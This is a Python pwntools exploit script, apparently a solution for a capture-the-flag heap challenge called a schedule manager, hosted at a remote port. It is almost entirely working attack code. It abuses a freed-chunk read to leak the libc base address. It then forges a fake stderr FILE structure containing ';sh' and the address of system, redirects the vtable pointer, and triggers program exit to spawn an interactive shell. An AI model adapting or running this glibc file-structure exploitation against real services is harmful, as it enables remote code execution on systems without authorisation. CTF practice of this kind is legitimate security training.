from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc naup.com 2000")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)

### heap IO
def login():
    sla(b"Username > ", b"MyGO!!!!!")
    sla(b"Password > ", b"TomorinIsCute")

def add(item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"1")
    sla(b"Input item > ", item)

def edit(idx, item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"2")
    sla(b"Index > ", str(idx).encode())
    sla(b"Edit item > ", item)

def delete(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"3")
    sla(b"Index > ", str(idx).encode())

def show(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"4")
    sla(b"Index > ", str(idx).encode())

def exitf():
    sla(b"< MyGO @ ScheduleManager $ > ", b"5")

### exploit

login()
add(b"a" * 0x500)
add(b"b" * 0x10)
delete(1)
delete(0)

show(0)
r.recvuntil(b'] is ')
leaklibc = u64(r.recvline().strip()[:6].ljust(8,b'\x00'))
libcbase = leaklibc - 0x21ace0

IO_STDERR = libcbase + 0x21b6a0
libc_system = libcbase + 0x50d70 

NAUPINFO("LEAKLIBC", hex(leaklibc))
NAUPINFO("LIBCBASE", hex(libcbase))
NAUPINFO(b'STD ERROR', hex(IO_STDERR))

payload  = p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload += p64(IO_STDERR) + p64(0x1d0) + p64(0x1d0) + p64(0)

add(payload)
delete(0)

print("Make fake vector")

add(b'Tomorin')
add(b'Soyorin')
add(b'Rana')

payload =  p32(0xfbad0101) + b";sh\x00" 
payload += b'\x00' * (0x58 - len(payload))
payload += p64(libc_system)
payload += b'\x00' * (0x88 - len(payload))
payload += p64(IO_STDERR - 0x10)
payload += b'\x00' * (0xa0 - len(payload))
payload += p64(IO_STDERR - 0x10)
payload += b'\x00' * (0xc0 - len(payload))
payload += p32(1)
payload += b'\x00' * (0xd0 - len(payload))
payload += p64(IO_STDERR - 0x10)
payload += p64(libcbase + 0x2170c0 - 0x48) 

edit(3, payload)
exitf()

NAUPINFO(b'STD ERROR', hex(IO_STDERR))
### interactive
ita()


